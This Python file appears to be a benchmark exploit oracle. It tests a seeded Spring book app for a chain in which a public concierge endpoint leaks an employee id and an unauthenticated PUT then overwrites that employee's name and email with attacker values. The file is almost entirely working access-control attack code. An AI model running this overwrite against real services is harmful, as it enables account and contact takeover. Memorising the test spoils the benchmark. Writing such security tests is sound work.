"""PoC exploit for the Spring book concierge link takeover chain."""

from mosaic.oracle.exploit import ExploitTest


class BookConciergeLinkTakeoverExploit(ExploitTest):
    """Public concierge link leaks a hidden employee id and enables takeover."""

    TARGET_BOOK_ID = 10001
    ATTACKER_NAME = "Mallory Concierge"
    ATTACKER_EMAIL = "mallory.concierge@example.com"

    @property
    def chain_id(self) -> str:
        return "spring_book_concierge_link_takeover"

    def execute(self) -> tuple[bool, str]:
        catalog = self.http_get("/book/all")
        if catalog.status_code == 404:
            return False, "Baseline book catalog endpoint /book/all returned 404."
        if not catalog.ok:
            return False, f"GET /book/all failed with HTTP {catalog.status_code}: {catalog.text[:200]}"

        try:
            catalog_payload = catalog.json()
        except Exception:
            return False, f"GET /book/all did not return JSON: {catalog.text[:200]}"

        if not isinstance(catalog_payload, list) or not catalog_payload:
            return False, "Expected /book/all to return the seeded in-memory book list."

        first_book = catalog_payload[0] if isinstance(catalog_payload[0], dict) else {}
        if "conciergeEmployeeId" in first_book or "routingMemo" in first_book:
            return False, "Internal book routing metadata leaked through /book/all before the concierge flow."

        before = self.http_get(f"/book/concierge/{self.TARGET_BOOK_ID}")
        if before.status_code == 404:
            return False, "Concierge endpoint /book/concierge/{id} is missing."
        if not before.ok:
            return False, (
                f"GET /book/concierge/{self.TARGET_BOOK_ID} failed with "
                f"HTTP {before.status_code}: {before.text[:200]}"
            )

        try:
            before_payload = before.json()
        except Exception:
            return False, f"Concierge endpoint did not return JSON: {before.text[:200]}"

        if not isinstance(before_payload, dict):
            return False, "Expected concierge endpoint to return a JSON object."

        contact_href = before_payload.get("contactHref")
        if not contact_href:
            return False, (
                "Concierge card did not expose contactHref. "
                f"Keys returned: {sorted(before_payload.keys())}"
            )
        if not str(contact_href).startswith("/api/employee/"):
            return False, f"Unexpected concierge contactHref format: {contact_href!r}"

        try:
            employee_id = int(str(contact_href).rsplit("/", 1)[-1])
        except ValueError:
            return False, f"Could not parse employee id from contactHref: {contact_href!r}"

        original_name = before_payload.get("contactName")
        if original_name == self.ATTACKER_NAME:
            return False, "Concierge card already points at the attacker-controlled contact."

        update_payload = {
            "id": employee_id,
            "name": self.ATTACKER_NAME,
            "emailId": self.ATTACKER_EMAIL,
            "internalNotes": "compromised via public concierge deep link",
        }
        update = self.http_put(f"/api/employee/{employee_id}", json=update_payload)
        if not update.ok:
            return False, (
                f"PUT /api/employee/{employee_id} failed with "
                f"HTTP {update.status_code}: {update.text[:200]}"
            )

        after = self.http_get(f"/book/concierge/{self.TARGET_BOOK_ID}")
        if not after.ok:
            return False, (
                f"Verification GET /book/concierge/{self.TARGET_BOOK_ID} failed with "
                f"HTTP {after.status_code}: {after.text[:200]}"
            )

        try:
            after_payload = after.json()
        except Exception:
            return False, f"Verification concierge response was not JSON: {after.text[:200]}"

        if not isinstance(after_payload, dict):
            return False, "Expected verification concierge response to be a JSON object."

        if after_payload.get("contactName") == self.ATTACKER_NAME:
            return True, (
                "Concierge contact takeover confirmed via leaked employee link: "
                f"bookId={self.TARGET_BOOK_ID}, employeeId={employee_id}, "
                f"contactName={self.ATTACKER_NAME}"
            )

        return False, (
            "Concierge link leaked an employee id but the overwrite did not change the "
            f"mapped contact. Verification keys: {sorted(after_payload.keys())}"
        )
